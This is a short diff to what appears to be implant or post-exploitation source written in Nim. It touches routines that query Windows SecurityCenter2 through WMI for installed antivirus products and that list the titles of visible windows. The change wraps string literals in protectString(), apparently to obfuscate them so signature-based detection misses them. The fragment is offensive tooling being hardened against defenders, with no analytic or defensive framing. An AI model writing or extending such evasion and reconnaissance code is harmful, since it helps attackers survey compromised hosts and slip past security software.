@@ -153,7 +153,7 @@ proc checksec(): bool =
     try:
         var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\securitycenter2"))
         for i in wmi.execQuery(protectString("SELECT displayName FROM AntiVirusProduct")):
-            products = products & "\n[+] " & $i.displayName
+            products = products & protectString("\n[+] ") & $i.displayName
         is_success = true
     except:
         is_success = false
@@ -196,7 +196,7 @@ proc enum_visible_windows(): bool =
     try:
         for i in windows():
             if i.isVisible() and i.getTitle().len() > 1:
-                windows.add("[+] [" & i.getTitle() & "]\n")
+                windows.add(protectString("[+] [") & i.getTitle() & "]\n")
         is_success = true
     except:
         is_success = false
